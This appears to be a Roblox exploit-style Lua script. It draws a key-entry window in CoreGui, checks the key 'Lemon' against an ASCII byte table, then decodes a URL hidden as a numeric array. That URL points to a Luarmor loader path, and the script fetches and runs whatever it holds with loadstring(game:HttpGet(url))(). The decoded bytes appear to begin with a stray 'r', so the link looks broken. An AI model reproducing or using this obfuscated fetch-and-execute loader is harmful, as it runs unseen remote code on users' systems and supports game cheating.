-- RobloxScriptKey – Local Key System with ASCII key table

local validKeyTable = {76, 101, 109, 111, 110} -- "Lemon"

local function isKeyCorrect(input)
    if #input ~= #validKeyTable then return false end
    for i = 1, #validKeyTable do
        if string.byte(input, i) ~= validKeyTable[i] then
            return false
        end
    end
    return true
end

-- GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "KeySystem"
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 320, 0, 170)
frame.Position = UDim2.new(0.5, -160, 0.5, -85)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 0, 40)
label.Position = UDim2.new(0, 0, 0, 0)
label.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.GothamBold
label.TextSize = 24
label.Text = "🔑 Enter Your Key"
label.TextWrapped = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.9, 0, 0, 40)
box.Position = UDim2.new(0.05, 0, 0, 50)
box.PlaceholderText = "Type your key here"
box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.Font = Enum.Font.Gotham
box.TextSize = 22
box.ClearTextOnFocus = false
box.Text = ""

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 100)
button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 22
button.Text = "✅ Submit"

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 30)
feedback.Position = UDim2.new(0, 0, 0, 145)
feedback.BackgroundTransparency = 1
feedback.TextColor3 = Color3.fromRGB(255, 100, 100)
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 18
feedback.Text = ""
feedback.TextWrapped = true

-- Encrypted loader URL (Luarmor)
local encryptedURL = {
114,104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,
47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,102,102,100,102,101,97,
100,102,48,97,102,55,57,56,55,52,49,56,48,54,101,97,52,48,52,54,56,50,97,57,51,56,46,108,
117,97
}

local function decodeURL(tbl)
    local s = ""
    for _, v in ipairs(tbl) do
        s = s .. string.char(v)
    end
    return s
end

button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$") -- trim spaces
    if isKeyCorrect(input) then
        feedback.Text = ""
        gui:Destroy()
        local url = decodeURL(encryptedURL)
        print("✅ Loading script from:", url)
        loadstring(game:HttpGet(url))()
    else
        feedback.Text = "❌ Invalid Key. Try again."
        wait(2)
        feedback.Text = ""
        box.Text = ""
    end
end)
